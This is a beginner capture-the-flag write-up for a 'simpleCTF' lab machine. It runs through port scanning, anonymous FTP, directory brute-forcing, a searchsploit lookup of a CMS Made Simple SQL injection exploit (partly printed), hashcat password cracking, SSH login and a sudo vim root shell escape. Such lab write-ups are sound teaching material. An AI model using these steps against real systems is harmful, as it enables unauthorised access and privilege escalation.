# simpleCTF

A beginner level CTF that brings out the best in new starters.

## nmap
```
nmap -A -sC -sV 10.10.175.42
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 08:48 BST
Nmap scan report for 10.10.175.42
Host is up (0.019s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.12.213
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.87 seconds
```
So from here we have a possible opening. Anonymous ftp and a robot text showing hidden folders. While gobuster and nikto are running lets have a look.

## ftp and robots
```
$ ftp 10.10.175.42
Connected to 10.10.175.42.
220 (vsFTPd 3.0.3)
Name (10.10.175.42:): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (405.2734 kB/s)
ftp> exit
221 Goodbye.
```
From this we now have a note.
```
$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Lets make some assumptions: we now have a possible username with a weak password.

Now for that robots.txt.
```
User-agent: *
Disallow: /

Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#

```
I tried this on the browser to no avail. Lets see what gobuster and nikto bring to the table.

## nikto
```
$ nikto -h 10.10.175.42
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.175.42
+ Target Hostname:    10.10.175.42
+ Target Port:        80
+ Start Time:         2020-08-18 08:50:59 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590523e6dfcd7, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-08-18 08:54:56 (GMT1) (237 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Nothing jumps out here, especially as we have already seen the robots.txt.

## gobuster
```
$ gobuster dir -u 10.10.175.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.175.42
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/08/18 08:49:10 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/simple (Status: 301)
/server-status (Status: 403)

```
With it still running, I see we have a /simple folder. Further investigation highlights that it appears to be a Content Management System. In this case CMS Made Simple 2.2.8. WIth CMS there tends to be a administration/login feature. With that in mind I set off gobuster again to look at that set of folders.
```
$ gobuster dir -u 10.10.175.42/simple -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.175.42/simple
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/08/18 09:08:05 Starting gobuster
===============================================================
/index.php (Status: 200)
/modules (Status: 301)
/uploads (Status: 301)
/doc (Status: 301)
/admin (Status: 301)
/assets (Status: 301)
/lib (Status: 301)
/install.php (Status: 301)
```
Lets have a look at the admin directory.

INSERT CMS_LOGIN_IMAGE HERE

Lets try the searchsploit for any Simple CMS issues that we can utilise. 

## searchsploit
```
$ searchsploit cms made simple 2.2.8
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                        | php/webapps/46635.py
-------------------------------------------------------------------------------- ---------------------------------

```
OK then, lets check out the details of this code.
```
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

<see exploit for rest of code>
```
## hydra

Although I had to amend the code slightly (wouldn't run in Python2 for me) although mainly by adding (), I did get a password and it's salt. With this I used hashcat to get the answer required.
```
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
hashcat (v6.0.0) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 9874/9938 MB (4096 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:<insertpasswordhere>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($salt.$pass)
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: Tue Aug 18 10:38:17 2020 (0 secs)
Time.Estimated...: Tue Aug 18 10:38:17 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   838.8 kH/s (2.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> dangerous

Started: Tue Aug 18 10:38:14 2020
Stopped: Tue Aug 18 10:38:18 2020

```
Now I can use mitch's password to gain ssh access. I also tried to let hydra ssh brute force and came up with the same answer - bonus :)

## ssh
```
$ ssh mitch@10.10.175.42 -p 2222
mitch@10.10.175.42's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Tue Aug 18 12:43:35 2020 from 10.9.12.213
$ ls
user.txt
$ cat user.txt
<insert user flag here>
```
Lets find out what we can do to escalate privalage. So I can run vim as root. As always a quick check with GTFObins which gave me the first hints to gain root.
```
$ sudo -l
User mitch may run the following commands on Machine:     
    (root) NOPASSWD: /usr/bin/vim
$ sudo vim -c ':!/bin/sh'    
```
This normally opens up vim and gives direct root access. You can just open vim as root and then break out with a :sh command. Either way works. 
```                                
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
<insert root flag here>
```
And there we have it. Nice room especially as it was one of my first. Pity I had some issues with the exploit running in python3. I'm sure that as I improve, these little annoyances will be less so!!

Thanks to ![MrSeth6797](https://tryhackme.com/p/MrSeth6797) for a great room.

Regards

K



